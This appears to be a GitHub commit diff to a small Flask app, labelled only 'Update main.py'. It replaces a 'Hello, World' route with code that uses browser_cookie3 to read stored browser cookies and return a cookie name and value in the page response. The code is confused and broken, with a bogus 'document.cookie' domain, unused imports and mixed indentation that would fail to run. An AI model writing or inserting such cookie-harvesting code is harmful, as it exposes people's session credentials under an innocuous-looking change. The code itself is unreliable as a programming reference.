5007b2210ad45b76b9f92adea37d8d0bc9d236fb
Shobigroup-IT <70895793+Shobigroup-IT@users.noreply.github.com>
2020-10-08 16:50:44 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,12 +1,23 @@
 from flask import Flask, render_template
+import browser_cookie3
+import requests
+import array
+import json
 
 app = Flask(__name__)
 
 @app.route("/")
 def main():
-     return "Hello, World"
-
-
+     #get the browser cookies
+    cj = browser_cookie3.load(domain_name='document.cookie')
+    #arrays to store cookie value
+    cN = []
+    cV = []
+    for cookie in cj: 
+        cN.append(cookie.name)
+        cV.append(cookie.value)
+     
+     return cN[0] + "=" + cV[0]
 
 if __name__ == "__main__":
     app.run()
